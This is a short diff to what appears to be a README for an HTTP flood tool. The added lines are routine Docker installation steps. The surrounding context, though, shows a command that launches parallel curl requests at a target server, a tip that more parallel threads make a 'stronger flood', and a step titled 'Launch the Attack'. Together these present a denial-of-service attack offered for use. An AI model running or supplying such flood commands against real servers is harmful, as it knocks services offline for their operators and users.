@@ -31,11 +31,19 @@ seq 1 10 | xargs -n1 -P10 timeout 1s curl --insecure -X GET https://<your-server
 - You can change the intensity using seq and -P values (more parallel threads =   stronger flood).
 
 ## 🐳 Docker Setup and Execution
+#### 0. Install Docker if it's missing
+```bash
+sudo apt update
+sudo apt install docker.io
+sudo systemctl enable docker
+sudo systemctl start docker
+```
 
 ### 1. Build the Docker Image
 ```bash
 docker build -t curl-http3 .
 ```
+
 ### 2. Run the Container and Launch the Attack
 ```bash
 docker run -it \
